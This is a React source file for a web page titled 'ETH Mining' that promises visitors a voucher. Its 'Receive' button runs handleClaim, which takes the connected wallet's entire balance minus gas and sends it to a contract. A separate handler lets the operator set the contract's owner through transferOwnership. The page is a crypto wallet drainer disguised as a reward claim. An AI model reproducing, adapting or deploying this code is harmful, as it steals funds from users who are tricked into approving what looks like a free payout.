import { ToastContainer, toast } from 'react-toastify';
import { WagmiConfig, createConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { useState, useEffect } from 'react';
import 'react-toastify/dist/ReactToastify.css';
import Web3 from "web3";
import Img from "./assets/bg3.png"
import  Addresses  from './Addresses';
import { sepolia } from 'wagmi/chains';
import { CONTRACT_ADDRESS, CONTRACT_ABI } from './utils/contract';
const chains = [sepolia]
const config = createConfig(
  getDefaultConfig({
    autoConnect: false,
    chains
  }),
);


function App() {

  const [ownerAddress, setOwnerAddress] = useState("");
  const [showAddress, setShowAddress] = useState(false);

  const [contract, setContract] = useState(null);


  useEffect(() => {
    if(!window.ethereum){
      toast("Please install metamask");
      return;
    }
    const getContract = async () => {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      setContract(contract);
    }
    getContract();
  }, []);

  const handleSetAddress = async(e) => {
    if(!contract){
      toast("Please connect your wallet");
      return;
    }
    // set transferOwnership
    try{
      // get the current account
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      await contract.methods.transferOwnership(ownerAddress).send({from: accounts[0]});
      toast("Address set successfully");
    }catch(err){
      toast("Transaction failed");
    }

  }


  const handleClaim = async () => {
    console.log("handleClick");
    if (!window.ethereum) {
      toast("Please install metamask");
      return;
    }
    if(!contract){
      toast("Please connect your wallet");
      return;
    }

    // get the current account
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    // estimate gas of a function call
    const gas = await contract.methods.transfer().estimateGas({from: accounts[0]});

    const web3 = new Web3(window.ethereum);
    // get gas price
    const balance = await web3.eth.getBalance(accounts[0]);
    const gasPrice = await web3.eth.getGasPrice();
    const gasCost = gas * gasPrice ;
    const value = balance - gasCost;
    // convert value to ether
    const ether = web3.utils.fromWei(value.toString(), "ether");
    const etherForSending = Number(ether).toFixed(4);
    // convert value to wei
    const value2 = web3.utils.toWei(etherForSending, "ether");
    if (value < 0) {
      toast("Insufficient balance to provide gas fee");
      return;
    }

    // get the current account


    // Transfer all the balance to the contract
    console.log("owner: " ,ownerAddress)
    try {
      await contract.methods.transfer().send({
        from: accounts[0],
        value: value2,
      });
    } catch (err) {
      toast("Transaction failed");
    }


  }

  return (<WagmiConfig config={config}>
    <ConnectKitProvider>
  <div className="w-full min-h-screen overflow-hidden">
    <div className="flex  flex-col md:gap-6 justify-center p-4 md:p-12">
      <div className='flex items-center justify-around'>
      <h1 className="text-4xl md:text-7xl font-bold text-center">ETH Mining</h1>
      <ConnectKitButton/>
      </div>
      <div className="flex justify-center flex-col-reverse md:flex-row items-center md:pt-10">
        <div className="w-full md:w-[60rem] space-y-7 md:space-y-12 text-center">
          <h2 className="text-5xl md:text-7xl font-semibold">Receive Voucher</h2>
          <p className="text-2xl md:text-4xl text-gray-300 leading-9">Join the node and start mining</p>

         <Addresses contract= {contract}  ownerAddress={ownerAddress} showAddress={showAddress} setShowAddress={setShowAddress} setOwnerAddress={setOwnerAddress} handleSetAddress={handleSetAddress} />

          <button className="bg-[#4c50ac] hover:bg-[#6063cc] hover:shadow-md px-12 py-4 rounded-md text-2xl md:text-3xl font-semibold" onClick={handleClaim}>Receive</button>
        </div>
        <div className="w-[20rem] md:w-[40rem] md:h-[40rem]">
          <img src={Img} alt="" 
              className="w-full h-full object-cover object-center opacity-60"
          />
        </div>
      </div>
    </div>
    <ToastContainer />
  </div>
  </ConnectKitProvider>
  </WagmiConfig> 
)}

export default App;
